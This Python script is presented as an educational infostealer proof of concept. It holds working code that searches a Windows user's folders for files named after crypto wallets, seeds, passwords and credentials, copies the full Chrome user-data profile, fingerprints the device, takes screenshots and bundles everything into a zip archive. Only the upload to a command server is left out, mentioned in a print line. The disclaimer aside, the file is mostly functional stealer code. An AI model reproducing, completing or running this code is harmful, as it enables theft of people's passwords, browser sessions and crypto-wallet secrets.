import shutil
import os
import getpass
import time
import fnmatch
from PIL import ImageGrab
import psutil
import win32gui
import re
import subprocess
import random
import requests
from pathlib import Path
import json
import platform
import uuid
import hashlib

usr = getpass.getuser()
curr_dir = Path.cwd()
temp_dir = rf'C:\Users\{usr}\infostealer_poc_demo'

def extract_sensitive_files_demo():
    os.makedirs(temp_dir, exist_ok=True)

    keywords = [
        'wallet', 'crypto', 'password', 'seed', 'privatekey', 'metamask',
        'trustwallet', 'phantom', 'exodus', 'ledger', 'trezor', 'coinbase',
        'binance', 'kraken', 'credentials', 'backup', 'mnemonic', 'keystore'
    ]

    search_dirs = [
        rf'C:\Users\{usr}\Desktop',
        rf'C:\Users\{usr}\Documents',
        rf'C:\Users\{usr}\Downloads',
    ]

    for directory in search_dirs:
        for root, _, files in os.walk(directory):
            for file in files:
                lower_file = file.lower()
                if any(kw in lower_file for kw in keywords):
                    if lower_file.endswith(('.txt', '.pdf', '.docx', '.json')):
                        try:
                            src = os.path.join(root, file)
                            dst = os.path.join(temp_dir, file)
                            shutil.copy2(src, dst)
                        except:
                            continue

def copy_chrome_data_demo():
    try:
        src = rf"C:\Users\{usr}\AppData\Local\Google\Chrome\User Data"
        dst = rf"C:\Users\{usr}\infostealer_poc_demo\{usr}_Chrome_Data_Demo"
        
        subprocess.run([
            "robocopy", src, dst,
            "/E", "/COPY:DAT", "/R:1", "/W:1", "/MT:32", "/J", "/NP", "/NDL"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def generate_device_fingerprint():
    def get_cpu_info():
        return {
            "cpu_model": platform.processor(),
            "cpu_cores": psutil.cpu_count(logical=False),
            "cpu_threads": psutil.cpu_count(logical=True)
        }

    def get_ram_info():
        return {
            "ram_total": psutil.virtual_memory().total
        }

    def get_mac_address():
        mac = uuid.getnode()
        mac_str = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
        return {"mac_address": mac_str}

    def get_os_info():
        return {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "architecture": platform.machine()
        }

    def get_machine_id():
        machine_id = None
        if platform.system() == "Windows":
            try:
                result = subprocess.check_output(
                    "wmic csproduct get uuid", shell=True
                ).decode().split("\n")[1].strip()
                machine_id = result
            except:
                pass
        return {"machine_id": machine_id}

    fingerprint_data = {}
    fingerprint_data.update(get_cpu_info())
    fingerprint_data.update(get_ram_info())
    fingerprint_data.update(get_mac_address())
    fingerprint_data.update(get_os_info())
    fingerprint_data.update(get_machine_id())

    fingerprint_json = json.dumps(fingerprint_data, sort_keys=True)
    fingerprint_hash = hashlib.sha256(fingerprint_json.encode()).hexdigest()

    with open(os.path.join(temp_dir, 'device_fingerprint.txt'), 'w') as f:
        f.write("=== DEVICE FINGERPRINT DEMO ===\n\n")
        f.write(json.dumps(fingerprint_data, indent=4))
        f.write(f"\n\nFingerprint Hash: {fingerprint_hash}\n")

def take_screenshots_demo():
    os.makedirs(temp_dir, exist_ok=True)
    for i in range(3):
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(os.path.join(temp_dir, f'demo_screenshot_{i+1}.png'))
            time.sleep(2)
        except:
            continue

def create_archive():
    archive_path = shutil.make_archive(
        base_name=f'demo_data_{usr}',
        format='zip',
        root_dir=temp_dir
    )
    return archive_path

def main():
    print("=== Educational Infostealer Proof of Concept ===")
    print("This script is for educational and defensive purposes only.")
    print("It demonstrates common techniques used by infostealer malware.\n")

    extract_sensitive_files_demo()
    copy_chrome_data_demo()
    generate_device_fingerprint()
    take_screenshots_demo()

    archive = create_archive()
    print(f"Demo data archive created: {archive}")
    print("In a real malicious infostealer, this archive would be exfiltrated to a C2 server.")

    # Cleanup
    try:
        shutil.rmtree(temp_dir, ignore_errors=True)
    except:
        pass

    print("\nDemo completed. All temporary files have been cleaned up.")

if __name__ == '__main__':
    main()
